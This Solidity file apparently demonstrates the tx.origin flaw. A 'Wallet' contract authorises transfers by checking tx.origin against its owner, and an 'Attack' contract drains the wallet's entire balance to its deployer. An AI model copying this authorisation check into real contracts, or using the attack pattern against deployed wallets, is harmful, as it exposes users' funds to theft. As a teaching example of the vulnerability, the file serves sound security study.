// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract  Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }
    function transfer(address payable  _to,uint256 _amount)public{
        require(tx.origin == owner,"only owner");

        (bool success,)=_to.call{value: _amount}("");
        require(success,"failed to transfer");
    }
}

contract Attack{
    address payable public owner;
    Wallet public wallet;
    constructor(address _wallet){
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);

    }
    function attack()public{
        wallet.transfer(owner, address(wallet).balance);
    }
}